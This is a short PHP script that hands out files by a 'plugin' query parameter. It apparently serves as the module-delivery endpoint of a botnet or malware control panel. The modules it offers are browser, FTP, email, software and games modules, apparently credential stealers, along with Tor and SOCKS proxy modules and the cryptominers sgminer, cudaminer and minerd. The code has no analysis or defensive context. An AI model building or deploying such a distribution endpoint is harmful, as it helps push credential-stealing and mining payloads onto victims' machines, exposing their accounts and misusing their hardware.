<?php
// Process request
if (isset($_GET['plugin']))
{
	$file = '';
	
	if ($_GET['plugin'] == 'browser')
	{
		$file = 'browser.dat';
	}
	elseif ($_GET['plugin'] == 'ftp')
	{
		$file = 'ftp.dat';
	}
	elseif ($_GET['plugin'] == 'email')
	{
		$file = 'email.dat';
	}
	elseif ($_GET['plugin'] == 'software')
	{
		$file = 'software.dat';
	}
	elseif ($_GET['plugin'] == 'games')
	{
		$file = 'games.dat';
	}
	elseif ($_GET['plugin'] == 'tor')
	{
		$file = 'tor.dat';
	}
	elseif ($_GET['plugin'] == 'socks')
	{
		$file = 'socks.dat';
	}
	elseif ($_GET['plugin'] == 'sgminer')
	{
		$file = 'sgminer.dat';
	}
	elseif ($_GET['plugin'] == 'cudaminer')
	{
		$file = 'cudaminer.dat';
	}
	elseif ($_GET['plugin'] == 'minerd')
	{
		$file = 'minerd.dat';
	}
	

	if (file_exists($file)) 
	{
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($file).'"');
		header('Expires: 0');
		header('Cache-Control: must-revalidate');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file));
		readfile($file);
		exit;
	}
	else
	{
		//404
		//echo '404';
	}
}
else
{
	//echo '404';
}





?>